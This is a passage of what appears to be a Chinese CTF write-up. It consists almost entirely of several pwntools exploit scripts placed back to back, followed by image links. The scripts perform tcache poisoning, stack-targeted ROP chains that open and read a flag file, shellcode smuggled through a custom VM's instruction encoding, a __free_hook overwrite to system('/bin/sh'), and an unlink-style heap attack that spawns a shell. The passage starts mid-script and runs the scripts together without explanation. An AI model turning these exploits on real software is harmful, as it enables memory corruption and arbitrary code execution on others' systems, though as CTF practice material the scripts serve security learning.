sa(b'bytes):n', pl)

    #debug('b _exitnb freenb malloc')
key = (heap_base + 0x2000) >> 12
environ = libc_base + 0x20ad58

pl = xor_(0x7, b'x00'*0x200)
pl += store_(0x310, key ^ (environ - 0x28))
pl += stop_xx1()
pl += create(0xa, 0x500)
pl += create(0xb, 0x500)

pl += next_step()
sa(b'bytes):n', pl)

    #debug('b *$rebase(0x17d8)nb _exitnb mallocnb *$rebase(0x1784)n')

pl = xor_(0xb, b'x00'*0x10)
pl += load_(0x18, 0)
pl += stop_xx1()
pl += next_step()
sa(b'bytes):n', pl)

pl = show(0x0, 0x28)
pl += next_step()
sa(b'bytes):n', pl)

stack = u64(r(8))

pl = create(0xc, 0x500)
pl += create(0xd, 0x500)
pl += create(0xe, 0x500)
pl += dele(0xe)
pl += dele(0xd)
pl += next_step()
sa(b'bytes):n', pl)

key = (heap_base + 0x3000) >> 12
pl = xor_(0xc, b'x00'*0x200)
pl += store_(0x310, key ^ (stack - 0x178))
pl += stop_xx1()
pl += create(0xe, 0x500)
pl += create(0xd, 0x500)
pl += next_step()
sa(b'bytes):n', pl)

    #debug('b *$rebase(0x1f56)n')

rop = ROP(libc)

rax = libc_base + 0x00000000000dd237
rdi = libc_base + 0x000000000010f75b
rsi = libc_base + 0x0000000000110a4d
ret = libc_base + 0x000000000002882f

#0x000000000004b2d2 : mov edx, eax ; mov eax, 8 ; sub eax, edx ; ret
mov_edx_eax = libc_base + 0x000000000004b2d2
syscall = libc_base + (rop.find_gadget(['syscall','ret'])).address

pl = start_xx1(0xd)
pl += store_(0x20, rax)
pl += store_(0x28, 0)
pl += store_(0x30, mov_edx_eax)
pl += store_(0x38, rax)
pl += store_(0x40, 2)
pl += store_(0x48, rdi)
pl += store_(0x50, stack - 0x90)
pl += store_(0x58, rsi)
pl += store_(0x60, 0)
pl += store_(0x68, syscall)

pl += store_(0x70, rax)
pl += store_(0x78, 0x100)
pl += store_(0x80, mov_edx_eax)
pl += store_(0x88, rax)
pl += store_(0x90, 0)
pl += store_(0x98, rdi)
pl += store_(0xa0, 3)
pl += store_(0xa8, rsi)
pl += store_(0xb0, stack + 0x100)
pl += store_(0xb8, syscall)

pl += store_(0xc0, rax)
pl += store_(0xc8, 1)
pl += store_(0xd0, rdi)
pl += store_(0xd8, 1)
pl += store_(0xe0, syscall)

pl += store_(0xe8, int(b'x00galf/'.hex(), 16))

pl += store_(0x18, ret)
pl += stop_xx1()

pl += next_step()
sa(b'bytes):n', pl) 

lg('stack', stack)
lg('environ', environ)
lg('mp', mp)
lg('_IO_list_all', _IO_list_all)
lg('heap_base', heap_base)
lg('libc_base', libc_base)

inter()
pause()
from pwn import *
from struct import pack
from ctypes import *
import base64
from subprocess import run
    #from LibcSearcher import *
from struct import pack
import tty

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def mov_reg_data(reg, data):
    pay = p8(1) + p8((reg<<4)&0b11110000) + p16(data)
    return pay

def mov_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0) + p8(reg) + p16(0xffff)
    return pay

def adc_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b10001) + p8(reg) + p16(0xffff)
    return pay

def add_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b10000) + p8(reg) + p16(0xffff)
    return pay

def sbb_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b100001) + p8(reg) + p16(0xffff)
    return pay

def sub_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b100000) + p8(reg) + p16(0xffff)
    return pay

def not_reg(reg):
    pay = p8(0b1000000) + p8(reg) + p16(0xffff)
    return pay

def neg_reg(reg):
    pay = p8(0b1000001) + p8(reg) + p16(0xffff)
    return pay

def shr_reg(reg):
    pay = p8(0b1000010) + p8(reg) + p16(0xffff)
    return pay

def test_reg(reg):
    pay = p8(0b1000100) + p8(reg) + p16(0xffff)
    return pay

def jmp(offset):
    if offset < 0:
        return p8(0b1010000) + p8(0xff) + p16(0x10000+offset)
    else:
        return p8(0b1010000) + p8(0xff) + p16(offset)

def jz(offset):
    if offset < 0:
        return p8(0b1010001) + p8(0xff) + p16(0x10000+offset)
    else:
        return p8(0b1010001) + p8(0xff) + p16(offset)

def load_l(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1100000) + p8(reg) + p16(0xffff)
    return pay

def load_x(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1100001) + p8(reg) + p16(0xffff)
    return pay

def store_l(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1110000) + p8(reg) + p16(0xffff)
    return pay

def store_x(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1110001) + p8(reg) + p16(0xffff)
    return pay

def clc():
    return p8(0b10000000) + p8(0) + p16(0)

def mov_reg_data_(reg, data):
    print(reg, data)
    pay = p8(1) + p8((reg<<4)&0b11110000) + b'x0fx05'
    return pay

def sc(data):
    return p8(1) + p8(0) + asm(data)

p = process('./pwn')
    #p = remote('1.95.131.201', 10002)

    #debug('b *$rebase(0x274d)n')
    #debug('b *$rebase(0x2181)n')

pl = b''

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('push rsp; pop rsi')

pl += mov_reg_data(3, 0x40)

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('syscall')

pl += mov_reg_data(0, 0x3b)
pl += mov_reg_data(3, 0)

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('push rsi; pop rdi')

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('xor esi, esi')

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('syscall')

sa(b'Input ur code:n', pl)

sleep(1)
s(b'/bin/shx00')

inter()
    #pause()
struct param{
    _DWORD optcode;
    _DWORD config_name_size;
    _BYTE config_name[config_name_size];
    _DWORD content_size;
    _BYTE content[content_size];
}
from pwn import *

class Command:
    def __init__(self):
        self.code_head = b''
        self.code = b''
        self.cnt = 0

    def set_dispatch_handler(self,handler):
        self.code_head += p32(1)+p32(handler)

    def get(self,name):
        self.code += p32(0) + p32(len(name)) + name + p32(0) +b'x00'
        self.cnt+=1

    def add(self,name,content):
        self.code += p32(1)+p32(len(name))+name+p32(len(content))+content+b'x00'
        self.cnt += 1

    def update(self,name,content):
        self.code += p32(2) + p32(len(name)) + name + p32(len(content)) + content +b'x00'
        self.cnt += 1

    def dele(self,name):
        self.code += p32(3) + p32(len(name)) + name + p32(0) +b'x00'
        self.cnt += 1

    def visit(self):
        self.code += p32(4) + p32(0) + p32(0) +b'x00'
        self.cnt += 1

    def get_code(self):
        return self.code_head+p32(self.cnt)+self.code

    def clear(self):
        self.code_head = b''
        self.code = b''
        self.cnt = 0

libc = ELF("./libc.so.6")
# p = gdb.debug("./main",'b *$rebase(0x00000000000367A)')
p = process('./main')

cmd = Command()
'''构造大堆块uaf，泄露libc'''
cmd.set_dispatch_handler(ord('a'))
cmd.add(b'a',b'a'*0x500)
cmd.add(b'b',b'a')
cmd.add(b'c',b'a')
cmd.add(b'c',b'a'*0x410)
cmd.add(b'd',b'a'*0x400)
cmd.dele(b'd')
cmd.dele(b'c')
cmd.dele(b'b')
cmd.visit()
p.sendlineafter("ommand:",cmd.get_code())
p.recvuntil('nContent: ')
libc.address = u64(p.recv(6)+p16(0))-0x13140-0x1d9aa0
print('libc:',hex(libc.address))
cmd.clear()
'''堆风水，实现tcachebin attack'''
cmd.set_dispatch_handler(ord('a'))
#填满tcache，将堆块c放入fastbin中间位置
cmd.add(b'a',b'a'*0x40)
cmd.add(b'b',b'a'*0x40)
cmd.add(b'c',b'a'*0x40)
cmd.add(b'd',b'a'*0x40)
cmd.add(b'e',b'a'*0x40)
cmd.add(b'f',b'a'*0x40)
cmd.add(b'g',b'a'*0x40)
cmd.add(b'h',b'a'*0x40)
cmd.add(b'i',b'a'*0x40)
#使迭代器指向堆块c
cmd.add(b'c',b'a'*0x40)
cmd.dele(b'i')
cmd.dele(b'h')
cmd.dele(b'g')
cmd.dele(b'f')
cmd.dele(b'e')
cmd.dele(b'd')
cmd.dele(b'c')
cmd.dele(b'b')
cmd.dele(b'a')
#触发double free，并重新取回来修改fd，劫持free_hook
cmd.update(p64(libc.symbols['__free_hook']-0x20).ljust(0x40),b'2'*0x40)
#把tcache清空，将fastbin链入tcache
cmd.add(b'a',b'a'*0x40)
cmd.add(b'b',b'a'*0x40)
cmd.add(b'c',b'a'*0x40)
cmd.add(b'd',b'a'*0x40)
cmd.add(b'e',b'a'*0x40)
#劫持free_hook到system
cmd.add(b'/bin/sh',b'a'*0x10+p64(libc.symbols['system']).ljust(0x30))
p.sendlineafter("ommand:",cmd.get_code())

# gdb.attach(p)
p.interactive()
from pwn import *

def open_gate(idx):
    p.sendlineafter('choice >', str(1))
    p.sendlineafter('Which gate?',str(idx))

def close_gate(idx):
    p.sendlineafter('choice >', str(2))
    p.sendlineafter('Which gate?',str(idx))

def create_ocean(size):
    p.sendlineafter('choice >', str(3))
    p.sendlineafter('ocean.',str(size))

def pull_gate2ocean(size,idx):
    p.sendlineafter('choice >', str(4))
    p.sendlineafter('data',str(size))
    p.sendlineafter('Which gate?',str(idx))

def l2str(val):
    strs = hex(val)[2:].rjust(16,'0')
    ret = ''
    for i in range(7,-1,-1):
        ret += str(int(strs[i*2:(i+1)*2],16))+' '
    return ret

# p = gdb.debug('./chall','b *0x0000000004019DCnb *0x00000000004016D1')
# gdb.attach(p,'b *0x00000000040123Bncnset {char}*(long*)0x47e540=0')
# gdb.attach(p,'b *0x0000000004012CCncnset {char}*(long*)0x47e550=0')
# pause()
while True:
    p = process('./chall')
    try :
        magic_gadget = 0x0000000000402aff
        create_ocean(0x220)
        open_gate(2)
        open_gate(1)
        close_gate(2)
        create_ocean(0x2000)
        pull_gate2ocean(0x240+0x3a0+1,1)
        pull_gate2ocean(0x260,1)
        payload = b'a'*0x238+p64(0x3a0)+p64(0x47E580-0x20)+p64(0x47E580-0x18)
        payload = payload.ljust(0x260)
        time.sleep(0.5)
        p.send(payload)
        open_gate(2)
        pull_gate2ocean(0x30,1)
        payload1 = p64(1)*4+p64(0x465B00)+p64(0)
        payload1 = payload1.ljust(0x30,b'x00')
        time.sleep(0.5)
        p.send(payload1)
        pull_gate2ocean(8,1)
        time.sleep(0.5)
        p.send(p64(0x000000000454E10))
        create_ocean(8)
        pull_gate2ocean(8, 1)
        time.sleep(0.5)
        p.send(b'/bin/sh;')
        create_ocean(8)
        p.interactive()
        break
    
except:
        p.close()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/2-1736943077.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1736943078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1736943078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1736943079.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1736943080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1736943080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1736943080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1736943080.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/7-1736943081.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1736943081.png)